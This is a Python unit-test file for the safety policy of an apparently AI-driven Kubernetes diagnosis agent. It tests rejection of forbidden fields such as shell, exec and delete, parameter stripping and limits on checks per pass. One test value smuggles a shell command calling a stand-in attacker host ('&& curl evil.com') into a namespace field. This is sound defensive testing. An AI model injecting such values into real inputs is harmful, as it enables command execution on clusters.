"""Policy tests for incident diagnosis loop - Part 2.

Tests for forbidden fields, validation, and policy class.
"""

from __future__ import annotations

import unittest

from k8s_diag_agent.collect.incident_next_check_policy import (
    CheckValidationResult,
    NextCheckPolicy,
    strip_forbidden_fields,
    validate_next_check_proposal,
    validate_next_check_proposals,
)


class TestForbiddenCommandFields(unittest.TestCase):
    """Tests for forbidden command fields."""

    def test_command_field_rejected(self) -> None:
        """Proposal with command field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "command": "kubectl logs pod-xyz",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)
        self.assertIn("command", result.rejection_reason)

    def test_kubectl_field_rejected(self) -> None:
        """Proposal with kubectl field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "kubectl": "get pods",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_shell_field_rejected(self) -> None:
        """Proposal with shell field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "shell": "bash -c 'echo test'",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_exec_field_rejected(self) -> None:
        """Proposal with exec field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "exec": "some command",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_apply_field_rejected(self) -> None:
        """Proposal with apply field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "apply": "manifest.yaml",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)

    def test_delete_field_rejected(self) -> None:
        """Proposal with delete field is rejected."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "delete": "pod-xyz",
        }
        result = validate_next_check_proposal(proposal)

        self.assertFalse(result.accepted)
        self.assertTrue(result.safety_blocked)


class TestArbitraryKubectlText(unittest.TestCase):
    """Tests for arbitrary kubectl text rejection."""

    def test_kubectl_in_parameters_rejected(self) -> None:
        """kubectl command string in parameters is stripped."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default",
                "command": "kubectl get pods",  # This should be stripped
            },
        }
        result = validate_next_check_proposal(proposal)

        # The check is accepted but command param is stripped
        self.assertTrue(result.accepted)
        if result.validated_check and "parameters" in result.validated_check:
            self.assertNotIn("command", result.validated_check["parameters"])

    def test_shell_pattern_in_string_rejected(self) -> None:
        """Shell patterns in string values are stripped."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default && curl evil.com",  # Shell pattern
            },
        }
        result = validate_next_check_proposal(proposal)

        # Check accepted but dangerous value is stripped
        self.assertTrue(result.accepted)


class TestExcessiveChecks(unittest.TestCase):
    """Tests for excessive check proposals bounds."""

    def test_excessive_proposals_truncated(self) -> None:
        """Excessive proposals are bounded by max_checks_per_pass."""
        proposals = [
            {"check_id": "pod_logs", "title": f"Check {i}"}
            for i in range(10)
        ]

        accepted, results = validate_next_check_proposals(proposals, max_checks_per_pass=5)

        self.assertEqual(len(accepted), 5)
        self.assertEqual(len(results), 10)

    def test_all_checks_accepted_under_limit(self) -> None:
        """All checks accepted when under limit."""
        proposals = [
            {"check_id": "pod_logs", "title": "Check 1"},
            {"check_id": "pod_events", "title": "Check 2"},
            {"check_id": "deployment_status", "title": "Check 3"},
        ]

        accepted, results = validate_next_check_proposals(proposals, max_checks_per_pass=5)

        self.assertEqual(len(accepted), 3)
        self.assertTrue(all(r.accepted for r in results))

    def test_excess_rejections_have_reasons(self) -> None:
        """Excess rejections have proper reasons."""
        proposals = [
            {"check_id": "pod_logs", "title": f"Check {i}"}
            for i in range(7)
        ]

        accepted, results = validate_next_check_proposals(proposals, max_checks_per_pass=5)

        # Last 2 should be rejected with excess reason
        for result in results[5:]:
            self.assertFalse(result.accepted)
            self.assertIn("max_checks_per_pass", result.rejection_reason)


class TestParameterValidation(unittest.TestCase):
    """Tests for parameter validation."""

    def test_allowed_parameters_accepted(self) -> None:
        """Allowed parameters are accepted."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default",
                "object_name": "test-pod",
                "tail_lines": 100,
            },
        }
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)
        if result.validated_check and "parameters" in result.validated_check:
            params = result.validated_check["parameters"]
            self.assertIn("namespace", params)
            self.assertIn("object_name", params)

    def test_unknown_parameters_stripped(self) -> None:
        """Unknown parameters are stripped."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default",
                "unknown_param": "value",
            },
        }
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)
        if result.validated_check and "parameters" in result.validated_check:
            self.assertNotIn("unknown_param", result.validated_check["parameters"])

    def test_int_parameters_accepted(self) -> None:
        """Integer parameters are accepted."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default",
                "tail_lines": 50,
            },
        }
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)

    def test_bool_parameters_accepted(self) -> None:
        """Boolean parameters are accepted."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "parameters": {
                "namespace": "default",
                "previous": True,
            },
        }
        result = validate_next_check_proposal(proposal)

        self.assertTrue(result.accepted)


class TestStripForbiddenFields(unittest.TestCase):
    """Tests for strip_forbidden_fields function."""

    def test_strips_command_field(self) -> None:
        """command field is stripped."""
        proposal = {"check_id": "pod_logs", "command": "kubectl exec"}
        result = strip_forbidden_fields(proposal)

        self.assertNotIn("command", result)
        self.assertIn("check_id", result)

    def test_strips_kubectl_field(self) -> None:
        """kubectl field is stripped."""
        proposal = {"check_id": "pod_logs", "kubectl": "get pods"}
        result = strip_forbidden_fields(proposal)

        self.assertNotIn("kubectl", result)

    def test_preserves_safe_fields(self) -> None:
        """Safe fields are preserved."""
        proposal = {
            "check_id": "pod_logs",
            "title": "Read logs",
            "rationale": "Need to check logs",
            "priority": 1,
        }
        result = strip_forbidden_fields(proposal)

        self.assertEqual(result["check_id"], "pod_logs")
        self.assertEqual(result["title"], "Read logs")
        self.assertEqual(result["rationale"], "Need to check logs")
        self.assertEqual(result["priority"], 1)

    def test_strips_mutation_check_id(self) -> None:
        """Mutation check_id is stripped entirely."""
        proposal = {"check_id": "kubectl_exec", "title": "Exec"}
        result = strip_forbidden_fields(proposal)

        self.assertNotIn("check_id", result)


class TestPolicyClass(unittest.TestCase):
    """Tests for NextCheckPolicy class."""

    def test_policy_disallowed_actions(self) -> None:
        """Policy returns disallowed_actions."""
        policy = NextCheckPolicy()
        self.assertIsInstance(policy.disallowed_actions, list)
        self.assertIn("mutate_cluster", policy.disallowed_actions)

    def test_policy_allowed_actions(self) -> None:
        """Policy returns empty allowed_actions."""
        policy = NextCheckPolicy()
        self.assertEqual(policy.allowed_actions, [])
        self.assertIsInstance(policy.allowed_actions, list)

    def test_policy_read_only(self) -> None:
        """Policy returns read_only=True."""
        policy = NextCheckPolicy()
        self.assertEqual(policy.read_only, True)

    def test_policy_validate(self) -> None:
        """Policy.validate() works."""
        policy = NextCheckPolicy(max_checks_per_pass=3)
        proposals = [
            {"check_id": "pod_logs", "title": "Logs"},
            {"check_id": "pod_events", "title": "Events"},
        ]

        accepted, results = policy.validate(proposals)

        self.assertEqual(len(accepted), 2)


class TestValidationResult(unittest.TestCase):
    """Tests for CheckValidationResult."""

    def test_accepted_result_to_dict(self) -> None:
        """Accepted result.to_dict() works."""
        result = CheckValidationResult(
            accepted=True,
            validated_check={"check_id": "pod_logs"},
            rejection_reason=None,
            check_id="pod_logs",
            safety_blocked=False,
        )

        d = result.to_dict()
        self.assertEqual(d["accepted"], True)
        self.assertEqual(d["check_id"], "pod_logs")
        self.assertIsNone(d["rejection_reason"])

    def test_rejected_result_to_dict(self) -> None:
        """Rejected result.to_dict() works."""
        result = CheckValidationResult(
            accepted=False,
            validated_check=None,
            rejection_reason="not in registry",
            check_id="unknown",
            safety_blocked=False,
        )

        d = result.to_dict()
        self.assertEqual(d["accepted"], False)
        self.assertEqual(d["rejection_reason"], "not in registry")
        self.assertEqual(d["check_id"], "unknown")


if __name__ == "__main__":
    unittest.main()
